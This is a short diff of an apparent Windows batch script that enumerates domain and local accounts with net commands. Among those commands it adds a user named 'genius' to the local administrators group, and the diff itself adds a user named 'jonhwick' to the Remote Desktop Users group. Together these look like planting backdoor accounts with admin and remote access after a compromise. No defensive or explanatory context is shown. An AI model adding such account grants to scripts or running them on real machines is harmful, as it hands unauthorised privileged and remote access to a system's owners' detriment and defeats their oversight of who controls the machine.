@@ -44,6 +44,8 @@ net localgroup administrators /domain
 ECHO ============================
 net localgroup administrators genius /add
 ECHO ============================
+net localgroup "Remote Desktop Users" jonhwick  /add
+ECHO ============================
 net config workstation
 ECHO ============================
 net accounts
